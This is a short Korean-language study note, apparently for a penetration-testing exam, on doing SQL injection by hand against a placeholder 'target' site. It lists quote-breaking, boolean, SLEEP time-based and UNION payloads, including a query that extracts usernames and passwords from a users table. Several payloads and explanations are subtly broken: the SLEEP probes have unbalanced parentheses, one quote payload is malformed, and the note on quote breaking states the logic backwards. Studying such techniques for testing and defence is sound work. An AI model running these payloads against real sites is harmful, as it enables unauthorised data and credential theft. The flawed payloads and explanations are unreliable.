# sql inject

- 따옴표 탈출·주석 처리, Boolean(`AND 1=1`/`1=2`) 판별, `SLEEP()` 시간 기반, UNION 추출을 아우르는 SQL 인젝션 기본 문법과 수동 수행 정리
- 웹 파라미터에서 SQL 인젝션을 처음 의심하는 시점에 판별부터 시작해, 자동 도구 없이 기본 기법만으로 크리덴셜까지 확인할 때
- 파라미터 값이 쿼리에 그대로 삽입되어야 하고, 응답 차이(에러·본문·시간)를 관찰할 수 있어야 한다. UNION은 `ORDER BY n` 탐침으로 컬럼 수를 먼저 맞춘다

## 개요

SQL Injection은 웹 애플리케이션의 쿼리 파라미터를 악용해 DB에 접근하는 공격이다.
시험에서 sqlmap 같은 자동 공격 도구는 사용할 수 없으므로, 기본 기법을 손으로 익혀야 한다.

## GET/POST 공격 기본

```bash
# GET 파라미터
http://target/page.php?id=1

# 파라미터을 문자열로 바꾸는 요청
http://target/page.php?id=' OR 1=1--
http://target/page.php?id=' OR 1=1' --
```

- `' OR 1=1--`: SQL 주석(`--`)으로 나머지 쿼리를 주석 처리한다.
- 홀따옴표(`'`)로 문자열을 끊는다. 따옴표를 못 끊으면 쿼리가 깨지 않는다.

## 응답 분석 (수동 판별)

| 응답 | 의미 |
|------|------|
| 에러 메시지에 SQL 관련 오류 | 의심. Boolean 기반 공격으로 확인 |
| 다른 결과 없이 페이지가 그대로 | 아마 통과 |
| 테이블/컬럼 목록이 보임 | 의심. 정보 수집 단계 |

```bash
# 예시: 에러 확인
curl "http://target/page.php?id=' AND 1=1--"
curl "http://target/page.php?id=' AND 1=2--"
```

두 응답이 다르면(예: 에러 vs 무에러) SQL 주입이 있다.

## 시간 기반 공격

```bash
http://target/page.php?id=(SELECT IF(1, SLEEP(5), 0)))
http://target/page.php?id=(SELECT IF(0, SLEEP(5), 1)))
```

- 첫 요청이 5초 이상 걸리면, `SLEEP()`로 응답 시간을 확인한 것이다.
- 두 번째 요청이 빠르면 조건이 거짓이다(1=0).

## UNION 공격

```bash
http://target/page.php?id=1 UNION SELECT null, username, password FROM users--
```

- 두 번째 SELECT의 컬럼 수를 맞춰야 한다.
- 결과에 DB 사용자/비밀번호가 보이면 크리덴셜 확보의 출발점이 된다.

## 주의

- UNION은 컬럼 수를 정확히 맞춰야 한다. `ORDER BY n` 탐침으로 개수를 확정한다. → [MySQL SQLi PoC](./mysql_order_by_sqli.md)
- DB의 `information_schema`에서 테이블/컬럼을 조회한다.
